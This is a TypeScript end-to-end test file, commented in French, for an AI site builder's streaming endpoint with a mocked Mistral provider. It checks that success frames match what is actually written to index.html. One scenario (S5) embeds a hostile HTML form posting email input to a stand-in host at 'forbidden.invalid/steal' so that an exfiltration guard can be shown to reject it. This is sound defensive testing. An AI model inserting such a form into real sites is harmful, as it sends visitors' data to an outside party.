/**
 * É53 LOT B — AUTORITÉ DE VÉRITÉ du flux /stream de BOUT EN BOUT.
 *
 * Provider Mistral mocké (même harnais que closing-synthesis.test.ts).
 * Chaque scénario prouve la frame `done` ET l'état réel du fichier :
 *
 *   S1  création nominale (projet neuf)     → done updated:true,
 *       persistedVia 'engine', révision réelle, done.html === fichier relu
 *   S2  zéro section fermée                 → done updated:false + raison,
 *       AUCUN html, AUCUNE clôture (pas de frame closing après done)
 *   S3  modification sans cible (fragment sans </body>) → done updated:false,
 *       fichier byte-identique (aucune écriture)
 *   S4  génération tronquée (2ᵉ section jamais fermée) → done updated:true
 *       + partial:true + motif exact ; fichier contient la 1ʳᵉ section,
 *       pas la tronquée
 *   S5  refus du garde d'exfiltration       → frame error, AUCUN done,
 *       fichier intact (aucune écriture)
 *   S6  planFirst                           → done awaitingConfirmation:true
 *       + updated:false explicite (contrat de vérité)
 *   S7  modification ciblée réelle          → done updated:true, fichier
 *       modifié, sections voisines + titre préservés byte-exacts
 *
 * Comportement historique conservé et prouvé : un refus de persistance
 * (contrat / exfiltration / rollback / préflight) ABORTE le flux avec une
 * frame `error` « Persistance de index.html impossible : … » SANS frame done
 * (throw préexistant, honest-fail) — règle 7 du contrat : aucun succès.
 */
import './_lot-b-legacy-env.js';

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import type { Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { createApiServer } from '../src/server.js';

process.env.MISTRAL_API_KEY = 'test-key-truth-e2e';

const H = { 'Content-Type': 'application/json', 'x-tenant-id': 'truth-e2e-t1', 'x-user-role': 'OWNER' };

/** Construit un flux SSE de deltas (le provider mocké découpe en 2 chunks). */
function sse(...parts: string[]): string {
  return parts
    .map((p) => 'data: ' + JSON.stringify({ choices: [{ delta: { content: p } }] }) + '\n\n')
    .join('') + 'data: [DONE]\n\n';
}

const SECTION_HERO = '<SECTION name="hero" mode="create"><h1>Boulangerie du Coin</h1><p>Pains au levain.</p></SECTION>';
const SECTION_HEADER = '<SECTION name="header" mode="create"><header class="p-4"><h2>Le fournil</h2></header></SECTION>';

describe('É53 LOT B — vérité /stream de bout en bout (provider mocké)', () => {
  let server: Server;
  let baseUrl: string;
  const realFetch = globalThis.fetch;
  let streamScript = '';

  before(async () => {
    globalThis.fetch = (async (_url: unknown, init?: { body?: unknown }) => {
      let wantsStream = true;
      try { wantsStream = JSON.parse(String(init?.body ?? '{}')).stream === true; } catch { /* défaut : flux */ }
      if (wantsStream) {
        return new Response(streamScript, { status: 200, headers: { 'Content-Type': 'text/event-stream' } });
      }
      return new Response(JSON.stringify({
        choices: [{ message: { role: 'assistant', content: '{"summary":"Clôture","suggestions":["A","B","C"]}' } }],
        usage: { prompt_tokens: 10, completion_tokens: 10, total_tokens: 20 }
      }), { status: 200, headers: { 'Content-Type': 'application/json' } });
    }) as typeof fetch;
    const instance = createApiServer({ port: 0 });
    server = instance.server;
    await new Promise<void>((resolve) => { server.listen(0, () => { baseUrl = 'http://127.0.0.1:' + (server.address() as AddressInfo).port; resolve(); }); });
  });

  after(async () => {
    globalThis.fetch = realFetch;
    await new Promise<void>((resolve) => { server.close(() => resolve()); });
  });

  interface StreamResult {
    types: string[];
    events: Array<Record<string, unknown>>;
    done: Record<string, unknown> | null;
    error: Record<string, unknown> | null;
  }

  async function createProject(name: string): Promise<string> {
    const p = await realFetch(baseUrl + '/api/v1/projects', { method: 'POST', headers: H, body: JSON.stringify({ name }) });
    const pj = (await p.json()) as { project: { id: string } };
    return pj.project.id;
  }

  async function stream(projectId: string, message: string, body: Record<string, unknown> = {}): Promise<StreamResult> {
    const s = await realFetch(baseUrl + '/api/v1/projects/' + projectId + '/conversation/sessions', { method: 'POST', headers: H, body: '{}' });
    const sj = (await s.json()) as { session: { sessionId: string } };
    const res = await realFetch(baseUrl + '/api/v1/projects/' + projectId + '/conversation/sessions/' + sj.session.sessionId + '/stream', {
      method: 'POST', headers: { ...H, Accept: 'text/event-stream' },
      body: JSON.stringify({ message, ...body })
    });
    assert.equal(res.status, 200);
    const out: StreamResult = { types: [], events: [], done: null, error: null };
    const text = await res.text();
    for (const rawLine of text.split('\n')) {
      const line = rawLine.trim();
      if (!line.startsWith('data:')) continue;
      try {
        const ev = JSON.parse(line.slice(5).trim()) as Record<string, unknown> & { type: string };
        out.types.push(ev.type);
        out.events.push(ev);
        if (ev.type === 'done') out.done = ev;
        if (ev.type === 'error') out.error = ev;
      } catch { /* ignore */ }
    }
    return out;
  }

  async function fileContent(projectId: string): Promise<string> {
    const f = await realFetch(`${baseUrl}/api/v1/projects/${projectId}/files/content?path=index.html`, { headers: H });
    const fd = (await f.json()) as { file?: { content?: string } };
    return fd.file?.content ?? '';
  }

  it('S1 — création nominale : updated:true, persistedVia engine, révision, html === fichier relu', async () => {
    streamScript = sse('Voici votre site !\n\n', SECTION_HERO + '\n\n', SECTION_HEADER + '\n\nTerminé !');
    const projectId = await createProject('S1 création nominale');
    const out = await stream(projectId, 'Crée un site de boulangerie', { isModification: false });

    const done = out.done as Record<string, unknown> | null;
    assert.ok(done, 'frame done émise — frames: ' + out.types.join(','));
    assert.equal(done!['updated'], true, 'écriture réellement persistée et vérifiée');
    assert.ok(!('partial' in done!), 'succès complet : pas de partiel');
    assert.equal(done!['persistedVia'], 'engine', 'chemin orchestré (moteur injecté par server.ts)');
    assert.equal(typeof done!['revisionId'], 'string', 'identifiant de révision réellement créé');
    assert.deepEqual(done!['committedFiles'], [{ taskId: 'stream', files: ['index.html'] }]);
    assert.deepEqual(done!['unmetFiles'], []);
    assert.equal(('gate' in done!) === !('gateUnavailable' in done!), true, 'gate et gateUnavailable sont mutuellement exclusifs');
    const synthesis = done!['synthesis'] as { text: string; verdict: string };
    assert.equal(synthesis.verdict, 'success');
    assert.match(synthesis.text, /2 sections construites/);
    assert.equal(done!['closingPending'], true);
    assert.ok(out.types.indexOf('closing') > out.types.indexOf('done'), 'clôture après done (succès)');

    // PREUVE READ-BACK : le html annoncé est EXACTEMENT le fichier persisté.
    const html = String(done!['html']);
    assert.ok(html.includes('Boulangerie du Coin'));
    const persisted = await fileContent(projectId);
    assert.equal(html, persisted, 'done.html byte-identique au fichier réellement persisté');
  });

  it('S2 — zéro section fermée : updated:false + raison, aucun html, aucune clôture', async () => {
    streamScript = sse('Très bien, je note votre préférence pour une page épurée, sans structure de site.');
    const projectId = await createProject('S2 zéro section');
    const out = await stream(projectId, 'Réponds simplement, ne construis rien', { isModification: false });

    const done = out.done as Record<string, unknown> | null;
    assert.ok(done, 'frame done émise');
    assert.equal(done!['updated'], false);
    assert.match(String(done!['reason']), /aucune section exploitable générée/);
    assert.ok(!('html' in done!), 'aucun html pour un échec');
    assert.ok(!('closingPending' in done!), 'pas de clôture de succès');
    assert.ok(!('persistedVia' in done!));
    const synthesis = done!['synthesis'] as { verdict: string };
    assert.equal(synthesis.verdict, 'failure');
    assert.ok(!out.types.includes('closing'), 'aucune frame closing après un échec');
  });

  it('S3 — modification sans cible (fragment sans </body>) : updated:false, fichier byte-identique', async () => {
    const projectId = await createProject('S3 modify sans cible');
    const FRAGMENT = '<div data-section="header"><h1>En-tête du site</h1></div>\n<div data-section="hero"><h1>Ancien hero</h1></div>';
    const put = await realFetch(`${baseUrl}/api/v1/projects/${projectId}/files/content`, {
      method: 'PUT', headers: H, body: JSON.stringify({ path: 'index.html', content: FRAGMENT })
    });
    assert.ok(put.ok, 'fichier de test préparé (fragment SANS </body> : le repli P3 est impossible)');

    // La cible « galerie » n'existe pas et le fragment n'a pas de </body> :
    // la section ne peut être appliquée nulle part.
    streamScript = sse('Je cherche la galerie…\n\n', '<SECTION name="galerie" mode="modify"><div data-section="galerie"><h2>Galerie</h2></div></SECTION>');
    const out = await stream(projectId, 'Modifie la section galerie du site', { isModification: true });

    const done = out.done as Record<string, unknown> | null;
    assert.ok(done, 'frame done émise');
    assert.equal(done!['updated'], false, 'aucun changement de bytes = aucun succès (règle 2)');
    assert.match(String(done!['reason']), /aucune modification réellement appliquée/);
    assert.ok(!('html' in done!));
    const synthesis = done!['synthesis'] as { verdict: string };
    assert.equal(synthesis.verdict, 'failure');

    const persisted = await fileContent(projectId);
    assert.equal(persisted, FRAGMENT, 'le fichier reste byte-identique : aucune écriture');
  });

  it('S4 — génération tronquée : updated:true + partial:true + motif exact, fichier sans la section tronquée', async () => {
    streamScript = sse('Je construis la page…\n\n', SECTION_HERO + '\n\n', '<SECTION name="galerie" mode="create"><h2>Galerie en cours');
    const projectId = await createProject('S4 tronquée');
    const out = await stream(projectId, 'Crée un site de boulangerie avec galerie', { isModification: false });

    const done = out.done as Record<string, unknown> | null;
    assert.ok(done, 'frame done émise');
    assert.equal(done!['updated'], true, 'la partie fermée a réellement été persistée');
    assert.equal(done!['partial'], true, 'troncature = résultat partiel');
    const reasons = done!['partialReasons'] as string[];
    assert.ok(Array.isArray(reasons) && reasons.length >= 1);
    assert.match(reasons.join(' | '), /tronquée/);
    assert.equal(done!['persistedVia'], 'engine');
    const synthesis = done!['synthesis'] as { verdict: string; text: string };
    assert.equal(synthesis.verdict, 'partial');
    assert.match(synthesis.text, /PARTIEL/);

    const persisted = await fileContent(projectId);
    assert.ok(persisted.includes('Boulangerie du Coin'), 'la section fermée est persistée');
    assert.ok(!persisted.includes('Galerie en cours'), 'la section tronquée n\u2019a jamais été persistée');
  });

  it('S5 — refus du garde d\u2019exfiltration : frame error, AUCUN done, fichier intact', async () => {
    const EVIL = '<SECTION name="contact" mode="create"><h2>Contact</h2><form action="https://forbidden.invalid/steal"><input name="email"><button>Envoyer</button></form></SECTION>';
    streamScript = sse('Le formulaire…\n\n', EVIL);
    const projectId = await createProject('S5 exfiltration');
    const out = await stream(projectId, 'Crée un site avec un formulaire de contact', { isModification: false });

    assert.ok(out.error, 'frame error émise');
    assert.match(String(out.error!['error']), /Persistance de index\.html impossible/);
    assert.ok(!out.done, 'AUCUNE frame done : le refus n\u2019est jamais un succès ni un « terminé »');
    assert.ok(!out.types.includes('file_modified') && !out.types.includes('file_created'), 'aucune frame de fichier écrit');
    assert.ok(!out.types.includes('closing'));

    const persisted = await fileContent(projectId);
    assert.match(persisted, /Hello VibeCode/, 'le fichier seedé reste intact : aucune écriture');
  });

  it('S6 — planFirst : done awaitingConfirmation:true + updated:false explicite', async () => {
    streamScript = sse(SECTION_HERO);
    const projectId = await createProject('S6 planFirst');
    const out = await stream(projectId, 'Crée un site de boulangerie', { planFirst: true });

    const done = out.done as Record<string, unknown> | null;
    assert.ok(done, 'frame done émise');
    assert.equal(done!['awaitingConfirmation'], true, 'comportement PlanFirst intact');
    assert.equal(done!['updated'], false, 'contrat de vérité : PlanFirst n\u2019écrit rien');
    assert.ok(!('html' in done!));
    assert.ok(!out.types.includes('closing'));
    const persisted = await fileContent(projectId);
    assert.match(persisted, /Hello VibeCode/, 'aucune écriture en planFirst');
  });

  it('S7 — modification ciblée réelle : updated:true, fichier modifié, voisins + titre préservés', async () => {
    const projectId = await createProject('S7 modify ciblé');
    const INITIAL = '<!DOCTYPE html>\n<html lang="fr">\n<head><meta charset="utf-8"><title>Boulangerie</title></head>\n<body>\n<div data-section="header"><h1>Boulangerie du Coin</h1></div>\n<div data-section="hero"><h1>Ancien hero</h1><p>Pain du matin.</p></div>\n</body>\n</html>';
    const put = await realFetch(`${baseUrl}/api/v1/projects/${projectId}/files/content`, {
      method: 'PUT', headers: H, body: JSON.stringify({ path: 'index.html', content: INITIAL })
    });
    assert.ok(put.ok);

    streamScript = sse('Je change le hero…\n\n', '<SECTION name="hero" mode="modify"><div data-section="hero"><h1>Hero neuf</h1><p>Pain du soir.</p></div></SECTION>');
    const out = await stream(projectId, 'Change la section hero', { isModification: true });

    const done = out.done as Record<string, unknown> | null;
    assert.ok(done, 'frame done émise — frames: ' + out.types.join(','));
    assert.equal(done!['updated'], true, 'changement réel appliqué et persisté');
    assert.ok(!('partial' in done!), 'toutes les cibles trouvées : pas de partiel');
    assert.equal(done!['persistedVia'], 'engine');
    const synthesis = done!['synthesis'] as { verdict: string };
    assert.equal(synthesis.verdict, 'success');

    const persisted = await fileContent(projectId);
    assert.ok(persisted.includes('Hero neuf'), 'la modification est dans le fichier persisté');
    assert.ok(persisted.includes('Boulangerie du Coin'), 'la section voisine est préservée');
    assert.ok(persisted.includes('<title>Boulangerie</title>'), 'le titre est préservé');
    assert.ok(persisted.includes('</html>'), 'le document reste complet');
    assert.equal(String(done!['html']), persisted, 'done.html byte-identique au fichier persisté');
  });
});
